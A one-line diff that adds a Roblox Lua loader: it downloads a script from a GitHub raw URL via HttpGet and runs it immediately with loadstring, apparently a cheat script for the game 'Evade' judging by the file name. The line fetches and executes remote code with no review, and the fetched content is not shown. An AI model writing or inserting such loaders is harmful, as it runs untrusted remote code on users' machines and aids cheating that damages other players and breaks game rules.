@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/hlwn-evade-spam1-axsvoh79hc8gwf.lua"))()
